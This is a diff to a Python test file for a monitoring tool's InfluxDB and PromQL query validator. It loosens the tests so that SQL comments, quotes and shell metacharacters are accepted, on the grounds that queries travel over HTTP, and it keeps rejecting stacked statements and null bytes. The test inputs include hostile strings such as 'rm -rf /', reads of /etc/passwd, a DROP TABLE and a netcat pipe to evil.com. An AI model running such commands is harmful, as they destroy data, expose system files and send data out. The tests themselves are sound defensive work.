@@ -456,27 +456,29 @@ class TestInfluxDBQueryValidation:
             result = self.security.validate_influxdb_query(query)
             assert result is None, f"Should block write operation: {query}"
 
-    def test_sql_injection_blocked(self):
-        """SQL injection characters should be blocked."""
-        injection_queries = [
-            "SELECT * FROM cpu; DROP TABLE metrics",
+    def test_multiple_statements_blocked(self):
+        """Stacked SQL statements must be rejected."""
+        result = self.security.validate_influxdb_query(
+            "SELECT * FROM cpu; DROP TABLE metrics"
+        )
+        assert result is None
+
+    def test_comments_are_allowed(self):
+        """SQL comments are harmless for a single read-only statement."""
+        for query in (
             "SELECT * FROM cpu -- comment",
             "SELECT * FROM cpu /* comment */",
-        ]
-        for query in injection_queries:
-            result = self.security.validate_influxdb_query(query)
-            assert result is None, f"Should block SQL injection: {query}"
+        ):
+            assert self.security.validate_influxdb_query(query) is not None
 
-    def test_shell_injection_blocked(self):
-        """Shell injection characters should be blocked."""
-        injection_queries = [
+    def test_shell_characters_are_not_interpreted(self):
+        """The query is sent over HTTP; shell metacharacters are not executed."""
+        for query in (
             "SELECT * FROM cpu `whoami`",
             "SELECT * FROM cpu $(rm -rf /)",
             "SELECT * FROM cpu | cat /etc/passwd",
-        ]
-        for query in injection_queries:
-            result = self.security.validate_influxdb_query(query)
-            assert result is None, f"Should block shell injection: {query}"
+        ):
+            assert self.security.validate_influxdb_query(query) is not None
 
     def test_query_length_limit(self):
         """Very long queries should be rejected."""
@@ -502,29 +504,24 @@ class TestPrometheusQueryValidation:
             result = self.security.validate_prometheus_query(query)
             assert result is not None, f"Should allow valid query: {query}"
 
-    def test_shell_injection_blocked(self):
-        """Shell injection characters should be blocked."""
-        injection_queries = [
+    def test_shell_characters_are_not_interpreted(self):
+        """PromQL is sent over HTTP; shell metacharacters are never executed."""
+        for query in (
             "up; cat /etc/passwd",
             "`whoami`",
             "$(rm -rf /)",
             "up | nc evil.com 4444",
             "up > /dev/null",
             "up & shutdown",
-        ]
-        for query in injection_queries:
-            result = self.security.validate_prometheus_query(query)
-            assert result is None, f"Should block shell injection: {query}"
+        ):
+            assert self.security.validate_prometheus_query(query) is not None
 
-    def test_quote_injection_blocked(self):
-        """Quotes should be blocked to prevent shell escaping."""
-        quoted_queries = [
-            'up{job="test"}',
-            "up{job='test'}",
-        ]
-        for query in quoted_queries:
-            result = self.security.validate_prometheus_query(query)
-            assert result is None, f"Should block quote injection: {query}"
+    def test_quotes_and_comparisons_allowed(self):
+        for query in ('up{job="test"}', "up{job='test'}", "up > 0"):
+            assert self.security.validate_prometheus_query(query) is not None
+
+    def test_null_byte_blocked(self):
+        assert self.security.validate_prometheus_query("up\x00") is None
 
     def test_query_length_limit(self):
         """Very long queries should be rejected."""
